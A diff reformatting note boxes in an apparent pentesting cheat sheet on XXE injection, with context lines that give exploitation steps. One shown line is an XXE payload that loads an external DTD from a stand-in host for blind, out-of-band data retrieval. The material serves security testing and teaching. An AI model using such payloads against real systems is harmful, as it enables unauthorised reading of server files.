@@ -21,7 +21,9 @@
 1. Introduce (or edit) a DOCTYPE element defining an external entity with the file path.
 2. Edit a data value in the XML returned in the app's response to use the defined external entity.
 
-* Note: to systematically test for XXE, test each data node in the XML individually using your defined entity to see if it appears in the response.
+{% hint style="info" %}
+**Note**: to systematically test for XXE, test each data node in the XML individually using your defined entity to see if it appears in the response.
+{% endhint %}
 
 ```xml
 <! -- Original -->
@@ -74,7 +76,9 @@
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://YOUR-DTD-URL/example.dtd"> %xxe;]>
 ```
 
-Note: This technique might not work with multiline files.
+{% hint style="info" %}
+**Note**: This technique might not work with multiline files.
+{% endhint %}
 
 ### <mark style="color:yellow;">Via error messages</mark> <a href="#exploiting-blind-xxe-to-retrieve-data-via-error-messages" id="exploiting-blind-xxe-to-retrieve-data-via-error-messages"></a>
 
@@ -101,7 +105,7 @@ Trigger an XML parsing error message with the file contents.&#x20;
 
 Some applications receive client-submitted data, embed it on the server-side into an XML document, and then parse the document
 
-XInclude is a part of the XML specification that allows an XML document to be built from sub-documents
+`XInclude` is a part of the XML specification that allows an XML document to be built from sub-documents
 
 ```xml
 <foo xmlns:xi="http://www.w3.org/2001/XInclude">
